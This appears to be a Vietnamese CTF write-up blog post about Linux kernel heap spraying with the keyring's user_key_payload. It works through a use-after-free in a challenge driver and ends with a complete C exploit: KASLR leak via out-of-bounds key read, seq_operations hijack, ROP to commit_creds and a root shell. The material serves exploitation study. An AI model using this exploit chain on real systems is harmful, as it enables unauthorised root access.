@@ -1,0 +1,914 @@
+--- 
+title: HeapSpraying
+date: 2025-05-18 00:00:00 +0800
+description: 'HeapSpraying'
+tags: ['kernel','research']
+author: ['kuvee']
+draft: false
+---
+
+
+
+- Heap spraying là 1 kĩ thuật hỗ trợ tấn công thông qua việc phân bổ 1 lượng lớn các struct giống nhau để đạt được 1 layout memory cụ thể : 
+
+vd: nếu ta có 1 `heap overflow read/write` nhưng heap layout không thể biết được vì `SLAB_FREELIST_RANDOM` được bật , vì vậy ta cần spraying 1 lượng lớn các struct cụ thể để lắp đầy free-list và giúp `read/write` vào đúng struct đó 
+
+
+
+- có 2 option ở bài này : 
+
+`0XCODEFAFE` : giải phóng buf[idx] , ở đây tối đa chỉ được 2 obj , và `UAF` xuất hiện 
+`0XDEADBEEF` : allocate bằng `kmalloc` với 1 size tùy ý 
+
+ở bài này không có hàm `copy_to_user`
+
+```c
+__int64 __fastcall rwmod_ioctl(__int64 a1, int cmd, __int64 a3)
+{
+  __int64 v3; // r12
+  __int64 v5; // rbx
+  __int64 v6; // rdi
+  unsigned int v7; // [rsp+0h] [rbp-30h] BYREF
+  unsigned int size; // [rsp+4h] [rbp-2Ch]
+  __int64 v9; // [rsp+8h] [rbp-28h]
+  unsigned __int64 v10; // [rsp+18h] [rbp-18h]
+
+  v10 = __readgsqword(0x28u);
+  if ( !a3 )
+    return -1;
+  if ( cmd == 0xC0DECAFE )
+  {
+    if ( !copy_from_user(&v7, a3, 16) && v7 <= 1 )
+      kfree(buf[v7]);                           // uaf
+    return 0;
+  }
+  v3 = -1;
+  if ( cmd == 0xDEADBEEF )
+  {
+    if ( copy_from_user(&v7, a3, 16) )
+      return 0;
+    v5 = v7;
+    if ( v7 > 1 )
+      return 0;
+    buf[v5] = _kmalloc(size, 3520);
+    v6 = buf[v7];
+    if ( !v6 )
+      return 0;
+    if ( size > 0x7FFFFFFFuLL )
+      BUG();
+    if ( copy_from_user(v6, v9, size) )
+      return 0;
+  }
+  return v3;
+}
+```
+
+
+
+-------------------
+
+## USER_KEY_PAYLOAD 
+
+https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D
+
+- từ Linux 2.6 , kernel giới thiệu (key retention service) để lưu trữ key trong kernel-land cho các dịch vụ khác sử dụng , đồng thời cung cấp ba thao tác để thao tác key . ở đây là quan tâm đến key có tên là `user`
+
+
+- add_key `(GFP_KERNEL | __GFP_HARDWALL | GFP_NOWARN)`
+
+add_key được dùng để tạo hoặc cập nhật key với 1 loại và mô tả đã cho , khởi tạo nó bằng 1 payload của `plen` , sau đó treo nó trên `keyring` được chỉ định và trả về stt cho key
+
+```c
+#include <sys/types.h>
+#include <keyutils.h>
+
+key_serial_t add_key(const char *type, const char *description,
+                            const void *payload, size_t plen,
+                            key_serial_t keyring);
+```
+
+ta sẽ xem xét ngữ cách đối với pwn: 
+
+- Đầu tiên, obj 1 và obj2 sẽ được cấp phát trong không gian kernel, flag được cấp phát là GFP_KERNEL, dùng để lưu trữ description (chuỗi, kích thước tối đa là 4096), payload (dữ liệu thông thường, kích thước không giới hạn).
+
+`description` kích thước tối đa là 4096 , payload (dữ liệu thông thường , kích thước không giới hạn)
+
+đây là phần đầu của nó được định nghĩa như sau: 
+
+- sao chép description bằng cách dùng `strndup_user` , cái này có thể xem là kết hợp của `kmalloc` + `strcpy` đồng thời giới hạn tối đa là KEY_MAX_DESC_SIZE (4096) . cốt lõi của nó là dùng `memdup_user` để allocate và coppy object
+
+```c
+SYSCALL_DEFINE5(add_key, const char __user *, _type,
+		const char __user *, _description,
+		const void __user *, _payload,
+		size_t, plen,
+		key_serial_t, ringid)
+{
+	key_ref_t keyring_ref, key_ref;
+	char type[32], *description;
+	void *payload;
+	long ret;
+
+	ret = -EINVAL;
+	if (plen > 1024 * 1024 - 1)
+		goto error;
+
+	/* draw all the data into kernel space */
+	ret = key_get_type_from_user(type, _type, sizeof(type));
+	if (ret < 0)
+		goto error;
+
+	description = NULL;
+	if (_description) {
+		description = strndup_user(_description, KEY_MAX_DESC_SIZE);
+		if (IS_ERR(description)) {
+			ret = PTR_ERR(description);
+			goto error;
+		}
+		if (!*description) {
+			kfree(description);
+			description = NULL;
+		} else if ((description[0] == '.') &&
+			   (strncmp(type, "keyring", 7) == 0)) {
+			ret = -EPERM;
+			goto error2;
+		}
+	}
+
+	/* pull the payload in if one was supplied */
+	payload = NULL;
+
+	if (plen) {
+		ret = -ENOMEM;
+		payload = kvmalloc(plen, GFP_KERNEL);
+		if (!payload)
+			goto error2;
+
+		ret = -EFAULT;
+		if (copy_from_user(payload, _payload, plen) != 0)
+			goto error3;
+	}
+
+	//...
+```
+
+- việc coppy `payload` thì đơn giản hơn , chỉ cần dùng `kvmalloc(plen,GFP_KERNEL)` để allocate 1 obj có kích thước `plen` , sau đó dùng `copy_from_user`
+
+```
+/* pull the payload in if one was supplied */
+payload = NULL;
+
+if (plen) {
+	ret = -ENOMEM;
+	payload = kvmalloc(plen, GFP_KERNEL);
+	if (!payload)
+		goto error2;
+
+	ret = -EFAULT;
+	if (copy_from_user(payload, _payload, plen) != 0)
+		goto error3;
+}
+```
+
+Tuy nhiên, cả hai đối tượng này đều là đối tượng tạm thời, tương tự như setxattr , sẽ được giải phóng khi lệnh gọi hệ thống add_key() kết thúc:
+
+
+```
+	//...
+ error3:
+	kvfree_sensitive(payload, plen);
+ error2:
+	kfree(description);
+ error:
+	return ret;
+}
+```
+
+nhưng trên thực tế , phân bổ đối tượng thứ hai sẽ được thực hiện trong `add_key` và có 1 callstack như sau:
+
+```
+sys_add_key()
+	key_create_or_update()
+		key_alloc()
+```
+
+- `key_alloc` sẽ như sau: 
+
+
+```
+struct key *key_alloc(struct key_type *type, const char *desc,
+		      kuid_t uid, kgid_t gid, const struct cred *cred,
+		      key_perm_t perm, unsigned long flags,
+		      struct key_restriction *restrict_link)
+{
+	//...
+
+	desclen = strlen(desc);
+	quotalen = desclen + 1 + type->def_datalen;
+
+	//...
+
+	/* allocate and initialise the key and its description */
+	key = kmem_cache_zalloc(key_jar, GFP_KERNEL);
+	if (!key)
+		goto no_memory_2;
+
+	key->index_key.desc_len = desclen;
+	key->index_key.description = kmemdup(desc, desclen + 1, GFP_KERNEL);
+```
+
+leak: `user_key_payload` chứa 1 con trỏ hàm . đối với kiểu `user` , con trỏ này sẽ được gán 1 giá trị khi payload được free `user_free_payload_rcu` . do đó có thể free 1 payload và sau đó đọc content của payload thông qua `oob` chẳng hạn 
+
+
+```c
+int key_alloc(char *description, char *payload, int payload_len)
+{
+    return syscall(__NR_add_key,"user", description, payload, payload_len, 
+                   KEY_SPEC_PROCESS_KEYRING);
+}
+```
+
+- `keyctl` : quản lý key , `keyctl` cung cấp cho chúng ta chức năgn quản lý key trong kernel . cốt lõi là 1 lệch chuyển mạch lớn như `ioctl` . thực hiện các thao tác khác nhau dựa trên các tùy chọn khác nhau mà chúng ta truyền vào
+
+
+KEYCTL_REVOKE - Giải phóng payload
+
+- tùy chọn này tương ứng với việc gọi `keyctl_revoke_key()`, trong đó sẽ gọi đến `key_revoke()`, trong đó sẽ gọi `key->type->revoke(key)`. Đối với key có type là `"user"`, cuối cùng sẽ gọi đến `user_revoke()`:
+
+```
+void user_revoke(struct key *key)
+{
+	struct user_key_payload *upayload = user_key_payload_locked(key);
+
+	/* clear the quota */
+	key_payload_reserve(key, 0);
+
+	if (upayload) {
+		rcu_assign_keypointer(key, NULL);
+		call_rcu(&upayload->rcu, user_free_payload_rcu);
+	}
+}
+```
+
+-  user_free_payload_rcu() sẽ được gọi thông qua call_rcu() để giải phóng payload:
+
+```
+static void user_free_payload_rcu(struct rcu_head *head)
+{
+	struct user_key_payload *payload;
+
+	payload = container_of(head, struct user_key_payload, rcu);
+	kfree_sensitive(payload);
+}
+```
+
+-  KEYCTL_UPDATE - Cập nhật nội dung payload
+
+
+Tùy chọn này sẽ gọi đến `keyctl_update_key()`, đầu tiên sẽ phân bổ một đối tượng tạm thời để sao chép dữ liệu từ không gian người dùng, sau đó gọi key_update() để cập nhật payload, cuối cùng giải phóng đối tượng tạm thời:
+
+```
+long keyctl_update_key(key_serial_t id,
+		       const void __user *_payload,
+		       size_t plen)
+{
+	key_ref_t key_ref;
+	void *payload;
+	long ret;
+
+	ret = -EINVAL;
+	if (plen > PAGE_SIZE)
+		goto error;
+
+	/* pull the payload in if one was supplied */
+	payload = NULL;
+	if (plen) {
+		ret = -ENOMEM;
+		payload = kvmalloc(plen, GFP_KERNEL);
+		if (!payload)
+			goto error;
+
+		ret = -EFAULT;
+		if (copy_from_user(payload, _payload, plen) != 0)
+			goto error2;
+	}
+
+	/* find the target key (which must be writable) */
+	key_ref = lookup_user_key(id, 0, KEY_NEED_WRITE);
+	if (IS_ERR(key_ref)) {
+		ret = PTR_ERR(key_ref);
+		goto error2;
+	}
+
+	/* update the key */
+	ret = key_update(key_ref, payload, plen);
+
+	key_ref_put(key_ref);
+error2:
+	kvfree_sensitive(payload, plen);
+error:
+	return ret;
+}
+```
+
+- `key_update` sẽ gọi `key->type->preparse(&prep)` để allocate không gian payload mới và coppy dữ liệu , sau đó `key->type->update(key, &prep)` sẽ cập nhật payload và giải phóng payload cũ , cuối cùng gọi `key->type->free_preparse(&prep)`  : 
+
+
+```
+int key_update(key_ref_t key_ref, const void *payload, size_t plen)
+{
+	//...
+
+	memset(&prep, 0, sizeof(prep));
+	prep.data = payload;
+	prep.datalen = plen;
+	prep.quotalen = key->type->def_datalen;
+	prep.expiry = TIME64_MAX;
+	if (key->type->preparse) {
+		ret = key->type->preparse(&prep);
+
+	//...
+
+	ret = key->type->update(key, &prep);
+
+	//...
+
+	if (key->type->preparse)
+		key->type->free_preparse(&prep);
+	return ret;
+}
+```
+
+
+```c
+int user_preparse(struct key_preparsed_payload *prep)
+{
+	struct user_key_payload *upayload;
+	size_t datalen = prep->datalen;
+
+	if (datalen <= 0 || datalen > 32767 || !prep->data)
+		return -EINVAL;
+
+	upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
+	if (!upayload)
+		return -ENOMEM;
+
+	/* attach the data */
+	prep->quotalen = datalen;
+	prep->payload.data[0] = upayload;
+	upayload->datalen = datalen;
+	memcpy(upayload->data, prep->data, datalen);
+	return 0;
+}
+```
+
+
+
+
+KEYCTL_READ - Đọc content PAYLOAD
+
+- có rất nhiều thứ nhưng ta sẽ đề cập ý chính luôn , độ dài của dữ liệu sao chép bị giới hạn ở `payload-datalen` , bằng cách nào đó ta có thể thay đổi nó thành 1 giá trị lớn hơn -> `oobread`
+
+ KEYCTL_UNLINK - allocate toàn bộ key 
+ 
+ ```
+ int key_unlink(struct key *keyring, struct key *key)
+{
+	struct assoc_array_edit *edit = NULL;
+	int ret;
+
+	key_check(keyring);
+	key_check(key);
+
+	ret = __key_unlink_lock(keyring);
+	if (ret < 0)
+		return ret;
+
+	ret = __key_unlink_begin(keyring, key, &edit);
+	if (ret == 0)
+		__key_unlink(keyring, key, &edit);
+	__key_unlink_end(keyring, key, edit);
+	return ret;
+}
+ ```
+ 
+ full: 
+ 
+ ```c
+ #include <linux/keyctl.h>
+
+int key_alloc(char *description, char *payload, size_t plen)
+{
+    return syscall(__NR_add_key, "user", description, payload, plen, 
+                   KEY_SPEC_PROCESS_KEYRING);
+}
+
+int key_update(int keyid, char *payload, size_t plen)
+{
+    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
+}
+
+int key_read(int keyid, char *buffer, size_t buflen)
+{
+    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
+}
+
+int key_revoke(int keyid)
+{
+    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
+}
+
+int key_unlink(int keyid)
+{
+    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
+}
+ ```
+ 
+ 
+ tóm tắt dễ hiểu : 
+ 
+ sẽ có 2 lần allocate obj tạm (`strndup_user(_description)` và `kmalloc(plen)` + `copy_from_user()` ) và 2 lần allocate obj chính  `kmemdup_nul(desc, len+1)` ,`user_preparse() → kmalloc(sizeof(user_key_payload)+…)`
+ 
+ - obj3 : gắn vào key->description (data) , giữ đến khi key bị hủy (unlink)
+ - obj4 : gắn vào key làm dữ liệu với type là "user" (`struct user_key_payload` + data) , giữ đến khi revoke/invalidate/update/hủy , free theo RCU 
+
+
+```
+struct user_key_payload {
+	struct rcu_head	rcu;		/* RCU destructor */   0x10
+	unsigned short	datalen;	/* length of this data */   0x2
+	char		data[] __aligned(__alignof__(u64)); /* actual data */   -> 0x18
+};
+
+//...
+
+struct callback_head {
+	struct callback_head *next; 
+	void (*func)(struct callback_head *head); 
+} __attribute__((aligned(sizeof(void *))));  
+#define rcu_head callback_head
+
+```
+
+
+```
+addr: +0x00         +0x08        +0x10     +0x12       +0x18                   + (0x18 + ALIGN(plen,8))
+      ┌─────────────┬────────────┬─────────┬───────────┬────────────────────────┐
+      │ rcu.next    │ rcu.func   │ datalen │ padding   │ data[0 .. plen-1]     │
+      └─────────────┴────────────┴─────────┴───────────┴────────────────────────┘
+
+```
+ 
+ - alloc(desc) -> alloc(payload) -> alloc(description) -> alloc(payload) -> free(payload) -> free(desc)
+ 
+ 
+ 
+ - `keyctl_read(id,buf,buflen)` : với type `user` , kernel coppy min(buflen,payload->datalen) byte từ `payload->data`  (hàm này để leak)
+
+- `keyctl_revoke(id)`  : đánh dấu key `revoked` và free(payload) theo RCU (không free ngay). vì free theo RCU , ta sẽ có 1 địa chỉ kernel ở `user_key_payload` 
+- `keyctl_update(id,new_ptr,new_plen` : allocate payload với kích thước mới `(0x18 + ALIGN(new_plen,8))` 
+ 
+ --------------------
+ 
+## SPRAYING
+
+- Khi chúng ta gọi add_key() để cấp phát một khóa có chuỗi description, kiểu "user", độ dài plen và nội dung payload, kernel sẽ trải qua quy trình như sau:
+
+Đầu tiên, obj1 và obj2 sẽ được cấp phát trong không gian kernel, với flag là `GFP_KERNEL`, để lưu trữ description (chuỗi, kích thước tối đa là 4096) và payload (dữ liệu thông thường, kích thước không giới hạn).
+
+
+Cấp phát obj3 để lưu trữ description, cấp phát obj4 để lưu trữ payload, cả hai đều có flag là GFP_KERNEL.
+
+
+Giải phóng obj1 và obj2, trả về ID khóa.
+
+Trong đó, obj4 là một cấu trúc user_key_payload, được định nghĩa như sau:
+
+```c
+struct user_key_payload {
+	struct rcu_head	rcu;		/* RCU destructor */
+	unsigned short	datalen;	/* length of this data */
+	char		data[] __aligned(__alignof__(u64)); /* actual data */
+};
+
+//...
+
+struct callback_head {
+	struct callback_head *next;
+	void (*func)(struct callback_head *head);
+} __attribute__((aligned(sizeof(void *))));
+#define rcu_head callback_head
+```
+
+- tương tự msg_msg , `user_key_payload` có phần đầu và kích thước cố định , phần còn lại là data 
+
+khi khai thác cần lưu ý 2 điểm : 
+
+- description cần có độ dài khác với payload để đơn giản hóa mô hình khai thác
+- độ dài khi read key nhỏ hơn `user_key_payload->datalen` , nếu không quá trình read sẽ thất bại 
+
+Tuy nhiên, có một vấn đề ở đây: add_key() sẽ phân bổ một bản sao tạm thời của obj1 để chứa payload trước, sau đó mới phân bổ obj2 làm user_key_payload. Nếu chúng ta phân bổ một obj trước, giải phóng nó rồi mới gọi add_key(), thì obj đó sẽ không trực tiếp trở thành user_key_payload, mà sẽ tồn tại như một obj tạm thời để sao chép payload trong một vài lần phân bổ tiếp theo.
+
+Nhưng chúng ta có thể sử dụng kỹ thuật heap spraying để phân bổ UAF obj vào user_key_payload. Hãy xem xét quy trình sau:
+
+- Sử dụng chức năng của đề bài để tạo UAF object.
+
+- Heap spraying user_key_payload, UAF obj tồn tại như một obj tạm thời để sao chép payload.
+
+- Trang slub của kmem_cache_cpu cạn kiệt, yêu cầu một trang slub mới từ node để phân bổ user_key_payload. Sau khi hoàn thành, UAF obj được giải phóng và trở lại kmem_cache_node
+
+- Tiếp tục heap spraying user_key_payload, trang slub của kmem_cache_cpu cạn kiệt, yêu cầu một trang slub mới từ node để phân bổ user_key_payload.
+
+- Trang chứa UAF obj được lấy lại, UAF obj được phân bổ làm user_key_payload.
+- Sử dụng chức năng của đề bài để giải phóng UAF obj một lần nữa, sử dụng chức năng của đề bài để heap spraying và lấy được obj đó, từ đó ghi đè user_key_payload
+
+Tiếp theo, chúng ta xem xét việc read-oob sẽ cho kết quả gì. Ở đây, chúng ta không cần cấp phát thêm cấu trúc nào khác. Con trỏ hàm rcu_head->func chỉ được ghi và gọi sau khi đối tượng rcu được giải phóng, nhưng sau khi gọi xong, nó sẽ không được đặt thành NULL. Do đó, chúng ta có thể để lại con trỏ hàm kernel trên heap kernel bằng cách giải phóng khóa, từ đó hoàn thành việc rò rỉ địa chỉ cơ sở kernel.
+
+
+
+https://meteorpursuer.github.io/2023/02/05/RWCTF2023_Digging_into_kernel3_wp/
+
+https://blog.csdn.net/qq_61670993/article/details/133561075
+
+
+https://blog.csdn.net/qq_61670993/article/details/133580347
+
+
+
+## thực hành 
+
+
+- bài khá ngắn , ta có 2 `option` , nó sẽ có `bug` uaf nhưng không có hàm nào để có thể leak kernel khi `uaf` xảy ra như `coppy_to_user` , nên ta cần 1 số hỗ trợ từ các syscall khác ở kernel ( user_key_payload)
+
+
+và vì bài này `slab_freelist_random` nên ta có thể exploit như sau: 
+
+
+
+
+
+
+
+```c
+__int64 __fastcall rwmod_ioctl(__int64 a1, int a2, __int64 a3)
+{
+  __int64 v3; // r12
+  __int64 v5; // rbx
+  __int64 v6; // rdi
+  unsigned int v7; // [rsp+0h] [rbp-30h] BYREF
+  unsigned int n0x7FFFFFFF; // [rsp+4h] [rbp-2Ch]
+  __int64 v9; // [rsp+8h] [rbp-28h]
+  unsigned __int64 v10; // [rsp+18h] [rbp-18h]
+
+  v10 = __readgsqword(0x28u);
+  if ( !a3 )
+    return -1;
+  if ( a2 == -1059140866 )
+  {
+    if ( !copy_from_user(&v7, a3, 16) && v7 <= 1 )
+      kfree(buf[v7]);
+    return 0;
+  }
+  v3 = -1;
+  if ( a2 == 0xDEADBEEF )
+  {
+    if ( copy_from_user(&v7, a3, 16) )
+      return 0;
+    v5 = v7;
+    if ( v7 > 1 )
+      return 0;
+    buf[v5] = _kmalloc(n0x7FFFFFFF, 3520);
+    v6 = buf[v7];
+    if ( !v6 )
+      return 0;
+    if ( n0x7FFFFFFF > 0x7FFFFFFFuLL )
+      BUG();
+    if ( copy_from_user(v6, v9, n0x7FFFFFFF) )
+      return 0;
+  }
+  return v3;
+}
+```
+
+- trước hết ta cần leak kernelbase trước vì có `kaslr` bật , ta sẽ sử dụng `user_key_payload` như sau 
+
+`freelist ban đầu`: 
+
+`obj0 -> obj1 -> obj2 `
+
+alloc 2 obj
+
+- freelist hiện tại:  
+
+`obj2 -> ..... `
+
+tiếp theo ta sẽ free nó để có thể đặt user_key_payload: 
+
+alloc 2 obj
+
+- freelist hiện tại : 
+
+`obj0 -> obj1 -> obj2`
+
+bây giờ tiến hành sử dụng `key_alloc` để đặt nó lên 2 obj đã free (0 và 1): 
+
+k0 = `key_alloc`
+
+k1 = `key_alloc`
+
+
+ta cần nhớ lại cơ chế của `user_key_payload` , đầu tiên nó sẽ allocate 2 lần tạm , sau đó nó sẽ allocate 2 lần chính thức và free 2 lần tạm đó đi  (2 lần đó là `desciprtion` và `payload` ) , vì `description` sẽ khác size nên ta không cần quan tâm 
+
+- freelist hiện tại : 
+
+`obj0 -> obj1 -> obj2`
+
+
+vậy nếu `key_alloc` thì lần tạm sẽ lấy obj0 và lần chính thức sẽ lấy obj1
+
+vậy bây giờ freelist sẽ còn obj0 -> obj2 sau khi `key_alloc` lần đầu tiên: 
+
+`obj0 -> obj2`
+
+tương tự cho lần tiếp theo thì nó sẽ lấy obj2 ra , bây giờ k0 sẽ giữ obj1 và k1 giữ obj2 , điều ta cần làm là thay đổi `datalen` của `k0` có nghĩa là obj1 để leak được `k1` , và nhờ vào `uaf` nên có thể dễ dàng thực hiện việc này , nó sẽ trông như sau: 
+
+```c
+  // 0 -> 1 -> 2
+  add(0, 0x40, buf); // obj0
+  add(1, 0x40, buf); //  obj1
+  // 2
+  puts("[*] delete 1 and 0");
+  delet(1);
+  delet(0);
+  // 0 -> 1 -> 2
+  int k0 = key_alloc(
+      "kuvee1", (char *)buf,
+      0x40 - 0x18); // alloc(desc) ("kuvee1" nhỏ nên nó sẽ không lấy 0x40)  ->
+                    // alloc(payload -> lay 0x40) -> alloc(desc) ->
+                    // alloc(payload) -> free(tmp1) -> free(tmp2)
+  // 0 -> 2  , vi lan dau alloc tạm nó lấy 0 sau đó lấy tiếp 1 và free 0
+  puts("[*] allocate k1 and k2");
+  int k1 = key_alloc("kuvee2", (char *)buf, 0x40 - 0x18);
+  // vi SLAB_FREELIST_RANDOM không bật nên ta hoàn toàn có thể
+  // freelist : 0
+  puts("[*] key_revoke(k1)");
+  // key_revoke(k1);
+  //  freelist 2- > 0
+  delet(1);
+  // 1 -> 2 -> 0
+  // now , change size to big -> leak kbase
+  buf[0] = buf[1] = 0;
+  buf[2] = 0x100 * 8;
+  // puts("[*] add 1 to leak");
+  add(1, 0x40, buf);
+
+```
+
+tiếp theo là dùng `key_revoke` để giải phóng k1 (obj2) , và dùng `key_read` để `read_oob`
+
+
+
+
+
+
+![image](https://hackmd.io/_uploads/rk5-1Fjdxe.png)
+
+
+
+[image](https://hackmd.io/_uploads/Byj_WPiuel.png)
+
+
+[image](https://hackmd.io/_uploads/SyCYWws_gl.png)
+
+
+[image](https://hackmd.io/_uploads/BJnG5Ojuex.png)
+
+
+
+sau khi leak thành công `kernel` thì ta sẽ dùng `seq_operation` để `priveleged` , ở đây ta sẽ kết hợp nó với `ret2spill` để có thể `ret2usr` (đặt chuỗi rop và dùng 1 gadget như `add rsp,xx`) , ngoài ra vì stack lúc này khá là rối , nếu ta return vào đoạn như hình bên dưới thì khi `ireq` nó sẽ hoạt động không đúng 
+
+
+![image](https://hackmd.io/_uploads/rJs-yV3_lx.png)
+
+
+pop 10 giá trị trước khi ` mov rdi, rsp` , stack lúc này cần như thế này , 2 giá trị đầu sẽ được bỏ qua 
+
+![image](https://hackmd.io/_uploads/Syym4Nhuxl.png)
+
+
+
+![image](https://hackmd.io/_uploads/HkRQx5i_ee.png)
+
+ở đây mình cũng thắc mắc tại sao nó không thực hiện thay đổi bit của cr3 để swap `page table` nhưng vẫn có thể bypass được `kpti` ?  (tại +79 -> jmp đến +148)
+
+- `mov    rsp, QWORD PTR gs:0x6004` sẽ làm cho stack trở thành địa chỉ `cpu_entry_area` , như đã biết thì nếu `kpti` được bật thì vẫn có 1 số địa chỉ kernel cần thiết được đặt ở page table của userland và `cpu_entry_area` được mapping ở cả page của userland , vì vậy nếu ta thực hiện hành động ở đây thì không bị ảnh hưởng khi `kpti` bật 
+
+![image](https://hackmd.io/_uploads/r1_Gw43dxx.png)
+
+exp: 
+
+```c
+define _GNU_SOURCE
+
+#include <asm/unistd_64.h>
+#include <fcntl.h>
+#include <linux/keyctl.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/ipc.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+typedef uint64_t u64;
+typedef int64_t i64;
+typedef int32_t i32;
+typedef uint32_t u32;
+
+#define cmd_free 0xC0DECAFE
+#define cmd_alloc 0xDEADBEEF
+
+typedef struct {
+  u32 idx;
+  u32 size;
+  void *ptr;
+} note_t;
+
+#define VULN "/dev/rwctf"
+
+int fd;
+void add(int idx, int size, void *ptr) {
+  note_t node = {.idx = idx, .size = size, .ptr = ptr};
+  ioctl(fd, cmd_alloc, &node);
+}
+void delet(int idx) {
+  note_t node = {.idx = idx};
+  ioctl(fd, cmd_free, &node);
+}
+int key_alloc(char *description, char *payload, size_t plen) {
+  return syscall(__NR_add_key, "user", description, payload, plen,
+                 KEY_SPEC_PROCESS_KEYRING);
+}
+int key_read(int keyid, char *buffer, size_t buflen) {
+  return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
+}
+int key_revoke(int keyid) {
+  return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
+}
+
+void bind_core(int core) {
+  cpu_set_t cpu_set;
+  CPU_ZERO(&cpu_set);
+  CPU_SET(core, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+  printf("[*] process binded to core %d\n", core);
+}
+
+int main() {
+  bind_core(0);
+  size_t buf[0x100] = {0};
+  fd = open("/dev/rwctf", O_RDWR);
+  if (fd < 0) {
+    puts("open failed");
+    exit(-1);
+  }
+  // 0 -> 1 -> 2
+  add(0, 0x40, buf); // obj0
+  add(1, 0x40, buf); //  obj1
+  // 2
+  puts("[*] delete 1 and 0");
+  delet(1);
+  delet(0);
+  // 0 -> 1 -> 2
+  int k0 = key_alloc(
+      "kuvee1", (char *)buf,
+      0x40 - 0x18); // alloc(desc) ("kuvee1" nhỏ nên nó sẽ không lấy 0x40)  ->
+                    // alloc(payload -> lay 0x40) -> alloc(desc) ->
+                    // alloc(payload) -> free(tmp1) -> free(tmp2)
+  // 0 -> 2  , vi lan dau alloc tạm nó lấy 0 sau đó lấy tiếp 1 và free 0
+  puts("[*] allocate k1 and k2");
+  int k1 = key_alloc("kuvee2", (char *)buf, 0x40 - 0x18);
+  // vi SLAB_FREELIST_RANDOM không bật nên ta hoàn toàn có thể
+  // freelist : 0
+  puts("[*] key_revoke(k1)");
+  // key_revoke(k1);
+  //  freelist 2- > 0
+  delet(1);
+  // 1 -> 2 -> 0
+  // now , change size to big -> leak kbase
+  buf[0] = buf[1] = 0;
+  buf[2] = 0x100 * 8;
+  // puts("[*] add 1 to leak");
+  add(1, 0x40, buf);
+  key_revoke(k1);
+  int res = key_read(k0, (char *)buf, 0x100 * 8);
+  for (int i = 0; i < 20; i++) {
+    printf("leak[%d]: 0x%lx\n", i, buf[i]);
+  }
+  fflush(stdout);
+  u64 offset = 0x3d8210;
+  int64_t kbase = buf[6] - offset;
+  printf("kbase: 0x%lx\n", kbase);
+  // note : RDONLY
+  puts("[*] now open /proc/self/stat to overwrite stat");
+  add(0, 0x20, buf);
+  delet(0);
+  int fd_req = open("/proc/self/stat", O_RDONLY);
+  u64 prdi = kbase + (0xffffffff820001d6 - kbase);
+  u64 commit_creds = 0x00095c30 + kbase;
+  // u64 swaps_restores = kbase + 0x00e00ed0;
+  u64 swaps_restores = kbase + 0x00e00ef3;
+  // u64 swaps_restores = kbase + 0xe00f01;
+  u64 init_creds = kbase + 0x01850580;
+  u64 add_rsp_0x150 = kbase + 0x3a193a;
+
+  if (fd_req < 0) {
+    puts("open failed");
+    exit(-1);
+  }
+  delet(0);
+  add(0, 0x20, &add_rsp_0x150);
+  asm volatile(
+      ".intel_syntax noprefix;"
+      "mov r15,%[prdi];"
+      "mov r14,%[init_creds];"
+      "mov r13,%[commit_creds];"
+      "mov r12,%[swaps_restores];"
+      ".att_syntax"
+      :
+      : [prdi] "r"(prdi), [init_creds] "r"(init_creds),
+        [commit_creds] "r"(commit_creds), [swaps_restores] "r"(swaps_restores));
+  puts("[*] trigger now !!!!");
+  read(fd_req, buf, 8);
+  uid_t uid = getuid();
+  if (uid == 0) {
+    puts("[+] root right now ~~~~");
+    execl("/bin/sh", "-sh", NULL);
+  }
+  puts("i don't think it reach here");
+  return 0;
+
+  //
+}
+
+```
+
+tóm tắt: 
+
+
+```
+- ban đầu 
+
+0xffff888003fd1340 0 
+
+0xffff888003fd1380 1  
+
+0xffff888003fd13c0 2 
+
+------------------------
+
+alloc thì sẽ lấy 0 và 1 ra 
+ 
+free -> free
+
+freelist: 0xffff888003fd1340 -> 0xffff888003fd1380 -> 0xffff888003fd13c0
+
+k0: 0xffff888003fd1380  obj1
+
+freelist: 0xffff888003fd1340 -> 0xffff888003fd13c0
+
+k1 : 0xffff888003fd13c0 obj2
+
+freelist: 0xffff888003fd1340
+
+
+key_revoke(k1);
+
+gef> x/xg 0xffff888003fd13c0
+0xffff888003fd13c0:     0x0000000000000000
+gef>
+0xffff888003fd13c8:     0xffffffff813d8210
+gef>
+0xffff888003fd13d0:     0x0000000000000028
+gef>
+0xffff888003fd13d8:     0x0000000000000000
+gef>
+0xffff888003fd13e0:     0x0000000000000000
+
+
+delet1 : <-> delete 0xffff888003fd1380
+
+ta sẽ leak k1 từ k0
+```
+
+
+
+
+
+
+
+
+ref: https://docs.kernel.org/arch/x86/pti.html
